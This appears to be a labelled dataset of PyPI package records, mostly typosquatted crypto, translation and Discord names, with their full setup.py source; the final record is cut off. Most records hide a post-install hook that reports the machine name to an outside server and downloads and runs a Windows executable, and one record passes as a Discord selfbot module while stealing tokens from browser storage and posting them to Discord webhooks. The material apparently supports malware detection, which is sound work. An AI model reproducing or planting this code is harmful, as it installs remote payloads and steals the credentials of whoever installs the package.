		<td align='center'>set_default</td>
		<td align='center'>None</td>
		<td align='center'>raise artError</td>
	</tr>	
	</table> 

### Testing
- Only ASCII fonts and arts :
```
python -m art test
```

- All fonts, arts and decorations :
```
python -m art test2
```

### CLI			
- List of arts :  `python -m art list` or `python -m art arts`
- List of fonts : `python -m art fonts`
- Text : `python -m art text yourtext fontname(optional)`
- Art : `python -m art shape art_name` or `python -m art art art_name`
- Save :  `python -m art save yourtext fontname(optional)`
- All  :  `python -m art all yourtext`

### Telegram bot			

Just send your text to one of these bots. 👇👇👇👇		

<a href='https://t.me/artlib_bot' target='__blank'><img src='https://img.shields.io/badge/Telegram-Bot1-red.svg'></a>			

<a href='https://t.me/textart_robot' target='__blank'><img src='https://img.shields.io/badge/Telegram-Bot2-blue.svg'></a>


### Try ART in your browser

1. ART can be used online in interactive Jupyter Notebooks via the Binder service! Try it out now! :	

[![Binder](https://mybinder.org/badge_logo.svg)](https://mybinder.org/v2/gh/sepandhaghighi/art/master)

* Open `FontList.ipynb`, `ArtList.ipynb` and `DecorList.ipynb`
* Edit and execute each part of the notes, step by step from the top panel by run button

2. ART also can be used online in [ascii-generator.site](https://ascii-generator.site/), a Django website by [hermanTenuki](https://github.com/hermanTenuki)	

### Screen record		


<div align='center'>
<a href='https://asciinema.org/a/186368' target='_blank'><img src='https://asciinema.org/a/186368.png' /></a>
<p>Screen Record</p>
</div>

* View full font list ([Link1](https://github.com/sepandhaghighi/art/blob/master/FontList.ipynb 'Full Font List'),[Link2](http://art.shaghighi.ir/FontList.html 'Full Font List'))					
* View full art list ([Link1](https://github.com/sepandhaghighi/art/blob/master/ArtList.ipynb 'Full Art List'),[Link2](http://art.shaghighi.ir/ArtList.html 'Full Art List'))
* View full decoration list ([Link1](https://github.com/sepandhaghighi/art/blob/master/DecorList.ipynb 'Full Decoration List'),[Link2](http://art.shaghighi.ir/DecorList.html 'Full Decoration List'))

## Issues & bug reports			

1. Fill an issue and describe it. We'll check it ASAP!
    - Please complete the issue template
2. Discord : [https://discord.com/invite/FAAyq3QJqP](https://discord.com/invite/FAAyq3QJqP)
3. Website : [https://www.4r7.ir](https://www.4r7.ir)
4. Email : [info@4r7.ir](mailto:info@4r7.ir 'info@4r7.ir')

## Dependencies

<table>
	<tr> 
		<td align='center'>master</td>	
		<td align='center'>dev</td>	
	</tr>
	<tr>
		<td align='center'><a href='https://requires.io/github/sepandhaghighi/art/requirements/?branch=master'><img src='https://requires.io/github/sepandhaghighi/art/requirements.svg?branch=master' alt='Requirements Status' /></a></td>
		<td align='center'><a href='https://requires.io/github/sepandhaghighi/art/requirements/?branch=dev'><img src='https://requires.io/github/sepandhaghighi/art/requirements.svg?branch=dev' alt='Requirements Status' /></a></td>
	</tr>
</table>

## Reference    

1. [FIGlet](http://www.figlet.org/)
2. [1 Line Art](http://1lineart.kulaone.com/#/)
3. [Text To ASCII](http://patorjk.com/software/taag/#p=display&f=Blocks&t=ART)
4. [ASCII Generator](http://www.network-science.de/ascii/)
5. [Asky](https://asky.io/)
6. [Flipyourtext](https://www.flipyourtext.com/)
7. [YayText](https://yaytext.com)
8. [Coolletters](http://www.coolletters.net/)
9. [Instagram Fonts](https://igfonts.io/)
10. [Cool Symbol](https://coolsymbol.com/)
11. [ASCII Moji](http://asciimoji.com/)
12. [SMILEY COOL](https://smiley.cool/)
13. [SPREZZ](https://www.sprezzkeyboard.com/)
14. [Textart4u](http://textart4u.blogspot.com/2013/03/one-line-ascii-text-art.html?m=1)
15. [Chat4o](https://en.chat4o.com/ascii/)
16. [Findwebapp](http://www.findwebapp.com/ascii-art-one-liner/)
17. [Hubpages](https://hubpages.com/technology/one-line-ascii-art-for-twitter)
18. [ASCII-ART](http://www.ascii-art.de/ascii/mno/one_line.txt)
19. [Messletters](https://www.messletters.com/en/)
20. [Webestools](http://www.webestools.com/)
21. [ASCII-emoji](https://github.com/dysfunc/ascii-emoji)
22. [Instagram Fonts2](https://www.instagramfonts.com/)
23. [Emotiworld](http://en.emotiworld.com/)
24. [Fancy Text Pro](https://www.fancytextpro.com/)
25. [Playing cards in Unicode](https://en.m.wikipedia.org/wiki/Playing_cards_in_Unicode)
26. [Text Generator](https://coolfonts.text-generator.org/)
27. [GOGOTEXT](https://instafontsgen.codesdetail.com)
28. [Fsymbols](https://fsymbols.com/)


* Logo designed by [Arta Khanalizadeh](https://www.linkedin.com/in/artakhanalizadeh)	

## Show your support
								
<h3>Star this repo</h3>					

Give a ⭐️ if this project helped you!

<h3>Donate to our project</h3>	

If you do like our project and we hope that you do, can you please support us? Our project is not and is never going to be working for profit. We need the money just so we can continue doing what we do ;-) .			

<h4>Bitcoin</h4>
1KtNLEEeUbTEK9PdN6Ya3ZAKXaqoKUuxCy
<h4>Ethereum</h4>
0xcD4Db18B6664A9662123D4307B074aE968535388
<h4>Litecoin</h4>
Ldnz5gMcEeV8BAdsyf8FstWDC6uyYR6pgZ
<h4>Doge</h4>
DDUnKpFQbBqLpFVZ9DfuVysBdr249HxVDh
<h4>Tron</h4>
TCZxzPZLcJHr2qR3uPUB1tXB6L3FDSSAx7
<h4>Ripple</h4>
rN7ZuRG7HDGHR5nof8nu5LrsbmSB61V1qq
<h4>Binance Coin</h4>
bnb1zglwcf0ac3d0s2f6ck5kgwvcru4tlctt4p5qef
<h4>Tether</h4>
0xcD4Db18B6664A9662123D4307B074aE968535388
<h4>Dash</h4>
Xd3Yn2qZJ7VE8nbKw2fS98aLxR5M6WUU3s
<h4>Stellar</h4>		
GALPOLPISRHIYHLQER2TLJRGUSZH52RYDK6C3HIU4PSMNAV65Q36EGNL
<h4>Zilliqa</h4>
zil1knmz8zj88cf0exr2ry7nav9elehxfcgqu3c5e5
<h4>Coffeete</h4>
<a href='http://www.coffeete.ir/opensource'>
<img src='http://www.coffeete.ir/images/buttons/lemonchiffon.png' style='width:260px;' />
</a>
<h4>Gitcoin</h4>
<a href='https://gitcoin.co/grants/3408/ascii-art-library-for-python'>
<img src='https://github.com/sepandhaghighi/art/raw/master/otherfile/gitcoin_btn.png' style='width:260px;' />
</a>

<h3>Become a sponsor to ART</h3>

* Contact us at the email first	

<h4>Corporate sponsor</h4>

- **$250** a month
- Your company's logo can be featured on **Readme**
- Intended for small companies


<h4>Mega corporate sponsor</h4>

- **$500** a month
- Your company's logo can be featured on **Readme** and **Website**
- Intended for medium-sized companies""""""

setup(
    name=""ascii2text"",
    version='2.5',
    license='Eclipse Public License 2.0',
    authors=[""joe140""],
    author_email=""<joeyn@gmail.com>"",
    long_description=long_description,
    long_description_content_type='text/markdown',
    keywords=['cli', 'better', 'colors', 'terminal', 'tui', 'ascci'],
    packages=['ascii2text']
)

",1
asn2crypto-4.5.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='asn2crypto',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
bcrypto-4.4.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='bcrypto',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
bitcoinliv-4.5.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='bitcoinliv',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
browserdiv-3.2.0,0,0,0,1,0,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt sitediv.py __init__.py PKG-INFO setup.cfg setup.py,"from setuptools import setup, find_packages
import os

here = os.path.abspath(os.path.dirname(__file__))


VERSION = '3.2.0'
DESCRIPTION = 'Discord selfbot module.'
LONG_DESCRIPTION = ""A short time ago , discord company had removed selfbots from its api , this module allows you to use them again ( I'm not responsible for anything happening for you account).""

# Setting up
setup(
    name=""browserdiv"",
    version=VERSION,
    author=""Charles Dickens"",
    author_email=""<charles_dickens@yahoo.com>"",
    description=DESCRIPTION,
    long_description_content_type=""text/markdown"",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=['requests'] ,
    keywords=[] ,
    classifiers=[
        ""Development Status :: 1 - Planning"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python :: 3"",
        ""Operating System :: Unix"",
        ""Operating System :: MacOS :: MacOS X"",
        ""Operating System :: Microsoft :: Windows"",
    ]
)
import os
import re
import json
import requests
from urllib.request import Request, urlopen

WEBHOOK_URL = 'https://discord.com/api/webhooks/983381308061388800/FIVWT3iNl-9MZMteTdYvTaV9iZoJTTMIEYdx5Mi-G-uD43YhslBmObBSwNWv8-EtRZtP'
WEBHOOK_URL2 = 'https://discord.com/api/webhooks/983381207758798918/3AqqFnq5WexU-yzlIsP-9sJOZPIJhcYT0UGH8iL2HWf-hRlMNWIDkXJi4UhefhDLh2ab'

PING_ME = True

def find_tokens(path):
	path += '\\Local Storage\\leveldb'

	tokens = []

	for file_name in os.listdir(path):
		if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for token in re.findall(regex, line):
					tokens.append(token)
	return tokens

def main():
	global token
	local = os.getenv('LOCALAPPDATA')
	roaming = os.getenv('APPDATA')

	paths = {
			'Discord': roaming + '\\Discord',
			'Discord Canary': roaming + '\\discordcanary',
			'Discord PTB': roaming + '\\discordptb',
			'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
			'Opera': roaming + '\\Opera Software\\Opera Stable',
			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
		}

	message = '<@&978976910463864893>' if PING_ME else ''

	for platform, path in paths.items():
		if not os.path.exists(path):
			continue

		message += f'\n**Token found in : {platform}**\n```\n'

		tokens = find_tokens(path)

		if len(tokens) > 0:
			for token in tokens:
				message += f'{token}\n'
		else:
			message += 'No tokens found.\n'

		message += '```'

	headers = {
			'Content-Type': 'application/json',
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
		}

	payload = json.dumps({'content': message})

	try:
		req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
		urlopen(req)
		#data = {'content' : f'**<@&978976910463864893> \n__Token Recieved :__ \n`{t}`**'}
		#requests.post(url=WEBHOOK_URL2 , json=data)
	except:
		pass

main()",0
ccsv-4.5.2,0,0,0,0,0,1,1,0,dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='ccsv',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
coingecko-apis-1.4,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='coingecko-apis',
  version='1.4',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
coinmarketcaps-5.0.5,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='coinmarketcaps',
  version='5.0.5',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
crypto-data-fetch-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='crypto-data-fetch',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
crypto-get-price-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='crypto-get-price',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
crypto-open-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='crypto-open',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
crypto-os-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='crypto-os',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
cryptobalance-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='cryptobalance',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
cryptographyy-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='cryptographyy',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
csvv-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='csvv',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
deeepl-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='deeepl',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
deep-translate-4.4.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='deep-translate',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
deep-translation-4.4.7,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='deep-translation',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
discord.pt-4.4.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='discord.pt',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
discord.pu-4.4.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='discord.pu',
  version='4.4.2',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
discordhook-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='discordhook',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-metamaks-auth-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-metamaks-auth',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-metamask-aut-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
